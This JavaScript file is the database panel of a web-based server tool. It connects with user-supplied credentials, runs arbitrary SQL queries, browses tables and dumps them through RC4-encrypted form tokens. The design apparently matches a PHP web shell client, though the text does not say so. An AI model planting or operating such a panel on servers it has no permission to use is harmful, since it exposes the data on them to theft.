Zepto(function($){
	db_init();

});

var dbSupported = "";
var dbPageLimit = 50;

function db_init(){
	if((dbSupported = localStorage.getItem('db_supported'))){
		db_bind();
		output("db : "+dbSupported);
		db_add_supported();
	}
	else{
		send_post({dbGetSupported:""}, function(res){
			if(res!="error"){
				localStorage.setItem('dbSupported', res);
				dbSupported = res;
				db_bind();
				output("db : "+dbSupported);
				db_add_supported();
			}
		});
	}
}

function db_add_supported(){
    var splits = dbSupported.split(",");
	$.each(splits, function(i, k){
		$('#dbType').append("<option>"+k+"</option>");
	});
}

function change_db_type() {
    var type = $('#dbType').val();
    if((type=='odbc')||(type=='pdo')){
        $('.dbHostLbl').html('DSN / Connection String');
        $('.dbUserRow').show();
        $('.dbPassRow').show();
        $('.dbPortRow').hide();

    }else if((type=='sqlite')||(type=='sqlite3')){
        $('.dbHostLbl').html('DB File');
        $('.dbUserRow').hide();
        $('.dbPassRow').hide();
        $('.dbPortRow').hide();

    }else{
        $('.dbHostLbl').html('Host');
        $('.dbUserRow').show();
        $('.dbPassRow').show();
        $('.dbPortRow').show();
    }
}

function db_bind(){
	$('#dbType').on('change', function(e){
		change_db_type();
	});

	$('#dbQuery').on('keydown', function(e){
		if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
			db_run();
		}
	});
}

function db_nav_bind(){
    var dbType = $('#dbType').val();
    var boxNav = $('.boxNav');
    boxNav.off('click');
    boxNav.on('click', function(){
		$(this).next().toggle();
	});
    if(dbType==='sqlite'||dbType==='sqlite3'){
        boxNav.click();
    }

    var dbTable = $('.dbTable');
    dbTable.off('click');
    dbTable.on('click', function(){
        var type = $('#dbType').val();
        var table = $(this).html();
        var db = $(this).parent().parent().parent().parent().prev().html();
		db_query_tbl(type, db, table, 0, dbPageLimit);
	});

    var dumpTable = $('.dumpTable');
    dumpTable.off('click');
    dumpTable.on('click', function() {
        var type = $('#dbType').val();
        var table = $(this).next().html();
        var db = $(this).parent().parent().parent().parent().prev().html();
        var dbHost = $('#dbHost').val();
        var dbUser = $('#dbUser').val();
        var dbPass = $('#dbPass').val();
        var dbPort = $('#dbPort').val();

        var params = $.param({dbType:type, dbHost:dbHost, dbUser:dbUser, dbPass:dbPass, dbPort:dbPort, dbDB:db, dbTable:table});
        var dp_token = bin2hex(rc4(window['cipher_key'], params));

        var form = $('#form');
        form.append("<input type='hidden' name='dp_token' value='"+dp_token+"'>");
        form.submit();
        form.html('');
    });
}

function db_connect(){
    var dbType = $('#dbType').val();
    var dbHost = $('#dbHost').val();
    var dbUser = $('#dbUser').val();
    var dbPass = $('#dbPass').val();
    var dbPort = $('#dbPort').val();
	send_post({dbType:dbType, dbHost:dbHost, dbUser:dbUser, dbPass:dbPass, dbPort:dbPort}, function(r){
		if(r!='error'){
            $('.dbError').html('');
			$('#dbNav').html(r);
			$('.dbHostRow').hide();
			$('.dbUserRow').hide();
			$('.dbPassRow').hide();
			$('.dbPortRow').hide();
			$('.dbConnectRow').hide();
			$('.dbQueryRow').show();
			$('#dbBottom').show();
			db_nav_bind();
		}else $('.dbError').html('<span style="color: red;">Unable to connect</span>');
	});
}

function db_disconnect(){
    $('.dbHostRow').show();
    $('.dbUserRow').show();
    $('.dbPassRow').show();
    $('.dbPortRow').show();
	change_db_type();
	$('.dbConnectRow').show();
	$('.dbQueryRow').hide();
	$('#dbNav').html('');
	$('#dbResult').html('');
	$('#dbBottom').hide();
}

function db_run(){
    var dbType = $('#dbType').val();
    var dbHost = $('#dbHost').val();
    var dbUser = $('#dbUser').val();
    var dbPass = $('#dbPass').val();
    var dbPort = $('#dbPort').val();
    var dbQuery = $('#dbQuery').val();

	if((dbQuery!='')){
		send_post({dbType:dbType, dbHost:dbHost, dbUser:dbUser, dbPass:dbPass, dbPort:dbPort, dbQuery:dbQuery}, function(res){
			if(res!='error'){
				$('#dbResult').html(res);
				$('.tblResult').each(function(){
					sorttable.k(this);
				});
			}
		});
	}
}

function db_query_tbl(type, db, table, start, limit){
    var dbHost = $('#dbHost').val();
    var dbUser = $('#dbUser').val();
    var dbPass = $('#dbPass').val();
    var dbPort = $('#dbPort').val();

	send_post({dbType:type, dbHost:dbHost, dbUser:dbUser, dbPass:dbPass, dbPort:dbPort, dbQuery:'', dbDB:db, dbTable:table, dbStart:start, dbLimit:limit}, function(res){
		if(res!='error'){
			$('#dbResult').html(res);
			$('.tblResult').each(function(){
				sorttable.k(this);
			});
		}
	});
}

function db_pagination(type){
	var db = $('#dbDB').val();
    var table = $('#dbTable').val();
    var start = parseInt($('#dbStart').val());
    var limit = parseInt($('#dbLimit').val());
    var dbType = $('#dbType').val();

	if(type=='next'){
		start = start+limit;
	}else if(type=='prev'){
		start = start-limit;
		if(start<0) start = 0;
	}
	db_query_tbl(dbType, db, table, start, limit);
}